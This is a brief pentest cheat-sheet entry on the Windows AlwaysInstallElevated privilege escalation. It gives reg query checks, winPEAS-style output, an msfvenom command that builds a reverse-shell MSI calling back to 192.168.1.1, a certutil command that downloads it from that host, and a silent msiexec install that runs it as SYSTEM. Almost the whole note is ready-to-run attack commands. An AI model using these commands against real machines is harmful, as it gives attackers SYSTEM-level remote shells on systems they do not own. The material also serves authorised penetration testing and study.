# AlwaysInstallElevated

If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) \*.msi files as NT AUTHORITY\SYSTEM.

[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated ](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated)

```
����������͹ Checking AlwaysInstallElevated                                                                        
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -f msi -o priv.msi
```

```
certutil.exe -urlcache -split -f "http://192.168.1.1/priv.msi"
msiexec /quiet /qn /i C:\Users\test\Desktop\priv.msi
```

